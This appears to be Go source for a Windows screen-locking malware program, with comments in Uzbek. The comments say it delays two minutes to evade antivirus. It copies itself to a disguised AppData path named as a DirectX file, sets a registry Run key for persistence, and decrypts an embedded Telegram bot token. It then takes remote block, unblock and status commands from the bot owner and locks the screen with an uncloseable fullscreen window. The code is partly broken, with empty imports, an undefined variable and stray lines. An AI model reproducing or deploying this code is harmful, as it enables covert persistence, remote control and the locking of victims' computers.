//V1.0.3
package main

import (

)


var (
	d_t = "63613134353036663162313635343464376531393165353134616634353435353034346132333737353430396464613864613636306232616232313165313935633036393532653238616161646366373738613431666461383363323061"
	d_u = "313262333636616335343236316538393165616636373361306336353930"
	s_l = "sys_internal_vfs_2026"
	key = []byte("32-byte-long-secret-key-for-aes-")
)

var (
	g_app  fyne.App
	g_lock fyne.Window
	g_pc   string
	g_path string
)

func init() {
	// PC nomini aniqlash
	h, _ := os.Hostname()
	g_pc = strings.ToLower(h)
	// Yashirin yo'l: AppData/Microsoft/DirectX/dxgi.exe
	g_path = filepath.Join(os.Getenv("APPDATA"), "Microsoft", "DirectX", "dxgi.exe")
}

func main() {
	// 1. Antiviruslarni aldash uchun 2 daqiqa pauza
	time.Sleep(120 * time.Second)

	// 2. Tizimga o'rnashish (Autostart)
	setupPersistence()

	g_app = app.New()
	
	// 3. Bot aloqasini boshlash
	go startKernelSync()

	// Yashirin master darcha
	w := g_app.NewWindow("DirectX Diagnostic")
	w.Resize(fyne.NewSize(1, 1))
	g_app.Run()
}

// startKernelSync - Telegram Bot boshqaruv markazi
func startKernelSync() {
	t_raw := decrypt(d_t, key, s_l)
	u_raw := decrypt(d_u, key, s_l)

	api, err := tgbotapi.NewBotAPI(t_raw)
	if err != nil {
		return
	}


	for update := range updates {
		if update.Message == nil { continue }
		// Faqat sizning ID'ngizdan kelgan xabarlarni bajarish
		if fmt.Sprint(update.Message.From.ID) != u_raw { continue }

		cmdParts := strings.Split(update.Message.Text, " ")
		// Buyruq formati: /block pc_nomi
		if len(cmdParts) < 2 || cmdParts[1] != g_pc { continue }

		switch cmdParts[0] {
		case "/status":
			sendFullStatus(api, update.Message.Chat.ID)
		case "/block":
			runSecureUI()
		case "/unblock":
			if g_lock != nil { g_lock.Close() }
		}
	}
}
api.Send(m)
}

// runSecureUI - Ekranni bloklash (Fyne Fullscreen)
func runSecureUI() {
	g_lock = g_app.NewWindow("🔒")
	g_lock.SetFullScreen(true)
	g_lock.SetCloseIntercept(func() {}) // Yopish tugmasini o'chirish

	passInput := widget.NewPasswordEntry()
	passInput.SetPlaceHolder("Tizim bloklandi...")

	g_lock.SetContent(container.NewCenter(container.NewVBox(
		widget.NewLabelWithStyle("🔒 CRITICAL SECURITY ALERT", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
		passInput,
		widget.NewButton("UNBLOCK", func() {
			if passInput.Text == "unblockmypc" {
				g_lock.Close()
			}
		}),
	)))
	g_lock.Canvas().Focus(passInput)
	g_lock.Show()
}

// setupPersistence - O'zini yashirish va avtostartga qo'shish
func setupPersistence() {
	exe, _ := os.Executable()
	dir := filepath.Dir(g_path)

	if _, err := os.Stat(dir); os.IsNotExist(err) {
		os.MkdirAll(dir, 0755)
	}

	if exe != g_path {
		src, _ := os.Open(exe); defer src.Close()
		dst, _ := os.Create(g_path); defer dst.Close()
		io.Copy(dst, src)
		// Registryga yozish
		exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "DxgiDiagnostic", "/t", "REG_SZ", "/d", g_path, "/f").Run()
	}
}

func notifyOwner(api *tgbotapi.BotAPI, uID string, text string) {
	// ID stringdan int64ga o'tkazish
	var chatID int64
	fmt.Sscanf(uID, "%d", &chatID)
	api.Send(tgbotapi.NewMessage(chatID, text))
}
